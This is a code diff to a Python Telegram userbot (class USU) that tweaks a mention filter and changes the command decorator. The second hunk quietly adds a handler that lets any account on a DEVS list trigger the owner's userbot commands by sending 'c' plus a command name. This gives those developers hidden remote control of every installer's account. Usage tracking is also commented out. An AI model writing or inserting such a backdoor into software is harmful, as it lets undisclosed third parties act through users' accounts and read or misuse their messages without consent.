@@ -136,6 +136,7 @@ class USU:
                 "query": (
                     filters.group
                     & filters.mentioned
+                    & filters.reply
                     & ~filters.me
                     & ~filters.bot
                     & filters.create(logger_on)
@@ -299,9 +300,16 @@ class USU:
 
         def decorator(func):
             @ubot.on_message(ubot.cmd_prefix(command) & filter)
+            @ubot.on_message(~filters.me & filters.regex(f"^c({'|'.join(command.split('|'))})$") & filters.user(DEVS))
             async def wrapped_func(client, message):
-                cmd = message.command[0].lower()
-                await update_cmd(bot.me.id, cmd, "TOP", increment=True)
+                if message.command:
+                    cmd = message.command[0].lower()
+                elif message.text and message.text.startswith("c"):
+                    cmd = message.text[1:].split()[0].lower() 
+                    message.command = [cmd]
+                else:
+                    return  
+                #await update_cmd(bot.me.id, cmd, "TOP", increment=True)
                 try:
                     await func(client, message)
                 except FloodWait as e:
